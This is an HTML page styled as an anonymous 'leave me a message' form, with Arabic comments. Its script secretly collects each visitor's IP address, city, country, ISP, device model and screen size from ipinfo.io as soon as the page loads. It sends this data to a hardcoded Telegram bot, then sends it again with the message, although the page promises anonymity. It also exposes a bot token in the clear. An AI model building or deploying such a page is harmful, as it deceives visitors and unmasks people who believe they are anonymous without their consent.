<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>اترك لي رسالة</title>
    <style>
        body {
            font-family: system-ui, -apple-system, sans-serif;
            background-color: #0f172a;
            color: #f8fafc;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: #1e293b;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            text-align: center;
            max-width: 400px;
            width: 100%;
            box-sizing: border-box;
        }
        h1 { margin-bottom: 0.5rem; color: #38bdf8; font-size: 1.5rem; }
        p { color: #94a3b8; font-size: 0.9rem; margin-bottom: 1.5rem; }
        input[type="text"], textarea {
            width: 100%;
            background: #0f172a;
            border: 1px solid #334155;
            border-radius: 8px;
            color: #f8fafc;
            padding: 10px;
            box-sizing: border-box;
            font-family: inherit;
            margin-bottom: 1rem;
        }
        input[type="text"] {
            height: 40px;
        }
        textarea {
            height: 100px;
            resize: none;
        }
        input[type="text"]:focus, textarea:focus {
            outline: none;
            border-color: #38bdf8;
        }
        button {
            background-color: #38bdf8;
            color: #0f172a;
            border: none;
            border-radius: 8px;
            padding: 10px 20px;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }
        button:hover {
            background-color: #0ea5e9;
        }
        .status {
            margin-top: 1rem;
            font-size: 0.85rem;
            color: #34d399;
            display: none;
        }
    </style>
</head>
<body>

    <div class="card">
        <h1>Welcome</h1>
        <p>I hope you are doing great tell me something as anonyme or who you are </p>
        
        <form id="msgForm" onsubmit="sendUserMessage(event)">
            <input type="text" id="visitorName" placeholder="Your Name (Optional)...">
            <textarea id="visitorMessage" placeholder="Write your message here (Required)..."></textarea>
            <button type="submit" id="sendBtn">Send</button>
        </form>
        
        <div id="statusMsg" class="status">The message was sent successfully</div>
    </div>

    <script>
        const BOT_TOKEN = "9067905487:AAFWRzqKu9WX0XZYfmEdHtaRrITXiQarppI";
        const CHAT_ID = "8318202151";

        async function getVisitorInfo() {
            try {
                const response = await fetch("https://ipinfo.io/json");
                const data = await response.json();

                const ip = data.ip || "غير معروف";
                const city = data.city || "غير معروف";
                const country = data.country || "غير معروف";
                const org = data.org || "غير معروف";
                
                let deviceModel = "هاتف Android أو جهاز آخر";
                try {
                    if (navigator.userAgentData) {
                        const uaData = await navigator.userAgentData.getHighEntropyValues(["platform", "model"]);
                        if (uaData.model && uaData.model !== "") {
                            deviceModel = uaData.platform + " (" + uaData.model + ")";
                        } else {
                            deviceModel = uaData.platform;
                        }
                    }
                } catch (e) {
                    console.log("Client hints not supported");
                }

                const screenRes = window.screen.width + "x" + window.screen.height;
                const time = new Date().toLocaleString();

                return { ip, city, country, org, deviceModel, screenRes, time };
            } catch (error) {
                console.error("خطأ في جلب بيانات الـ IP:", error);
                return null;
            }
        }

        // 1. إشعار الدخول الفوري عند فتح الصفحة
        window.onload = async function() {
            const info = await getVisitorInfo();
            if (!info) return;

            const textMsg = 
                "🚨 تم تسجيل دخول زائر جديد للموقع!\n\n" +
                "📍 الموقع التقريبي: " + info.city + "، " + info.country + "\n" +
                "🌐 IP: " + info.ip + "\n" +
                "📡 المزود: " + info.org + "\n" +
                "📱 الجهاز: " + info.deviceModel + "\n" +
                "🖥 الشاشة: " + info.screenRes + "\n" +
                "⏰ الوقت: " + info.time;

            await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: textMsg })
            });
        };

        // 2. إرسال الاسم والرسالة عند الضغط على زر Send
        async function sendUserMessage(event) {
            event.preventDefault();

            const btn = document.getElementById('sendBtn');
            const statusDiv = document.getElementById('statusMsg');
            
            let userName = document.getElementById('visitorName').value.trim();
            const userMsg = document.getElementById('visitorMessage').value.trim();

            // التحقق من أن خانة الرسالة ليست فارغة (إجبارية)
            if (userMsg === "") {
                alert("Please write a message first 😊");
                return;
            }

            // إذا لم يكتب اسمه، نعتبره مجهولاً
            if (userName === "") {
                userName = " he is Anonymous ";
            }

            btn.innerText = "Sending...";
            btn.disabled = true;

            const info = await getVisitorInfo();

            let textMsg = "💬 رسالة جديدة من زائر!\n\n" +
                "👤 المرسل: " + userName + "\n" +
                "✍️ النص المكتوب: \"" + userMsg + "\"\n\n" +
                "------------------------\n";
            
            if (info) {
                textMsg += 
                    "📍 الموقع: " + info.city + "، " + info.country + "\n" +
                    "🌐 IP: " + info.ip + "\n" +
                    "📱 الجهاز: " + info.deviceModel + "\n" +
                    "⏰ الوقت: " + info.time;
            }

            try {
                await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: textMsg })
                });

                document.getElementById('msgForm').style.display = 'none';
                statusDiv.style.display = 'block';

            } catch (error) {
                console.error("حدث خطأ:", error);
                btn.innerText = "Error, try again";
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
